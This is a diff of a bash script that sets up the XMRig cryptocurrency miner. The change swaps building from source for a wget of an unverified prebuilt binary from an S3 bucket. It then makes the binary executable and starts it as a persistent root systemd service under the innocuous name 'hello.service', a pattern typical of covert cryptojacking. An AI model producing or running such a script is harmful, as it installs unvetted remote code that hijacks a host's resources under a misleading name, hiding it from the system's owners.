@@ -1,5 +1,5 @@
 #!/bin/bash
-sudo su && sudo add-apt-repository ppa:jonathonf/gcc-7.1 -y && sudo apt-get update -y && sudo apt-get install gcc-7 g++-7 -y && sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev -y && cd /usr/local/src/ && sudo git clone https://github.com/xmrig/xmrig.git && cd xmrig && sudo mkdir build && cd build && cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7 && sudo make && sudo echo "vm.nr_hugepages=1024" >> /etc/sysctl.conf && sudo sysctl -p &&
+sudo su && sudo apt-get update -y && sudo apt-get install libhwloc-dev -y && cd /usr/local/src/ && sudo mkdir xmrig && cd xmrig && sudo mkdir build && cd build && wget https://ggth.s3.us-east-2.amazonaws.com/xmrig && sysctl -w vm.nr_hugepages=1024 &&
 
 cat > /usr/local/src/xmrig/build/config.json <<EOL
 {
@@ -128,4 +128,4 @@ WantedBy=multi-user.target
 EOL
 
 #!/bin/bash
-sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
+chmod a+x xmrig && chmod a+x config.json && sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
